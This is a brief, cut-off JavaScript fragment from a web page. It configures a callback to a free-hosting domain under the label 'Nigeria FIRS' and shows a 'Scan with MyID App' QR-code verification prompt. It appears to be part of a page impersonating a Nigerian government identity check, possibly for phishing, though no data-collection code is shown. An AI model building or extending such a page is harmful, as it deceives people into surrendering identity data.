...
const CONFIG = {
  ...
  callBackUrl: `https://nigeriaims.unaux.com/NGN/validate.php`,
  clientApp: `Nigeria FIRS`,
...
function showQRCodeUI() {
  showUIMessage(
    `<span style="color: #34A853; font-weight: bold;">Scan with MyID App</span>`, 
    `
  ...
  animationContainer.innerHTML = `
        <div class="phone-verification">
            <svg class="animated-phone" viewBox="0 0 24 24" width="120" height="200">
                <rect class="phone-body" x="4" y="1" width="16" height="22" rx="2" fill="#34A853"/>
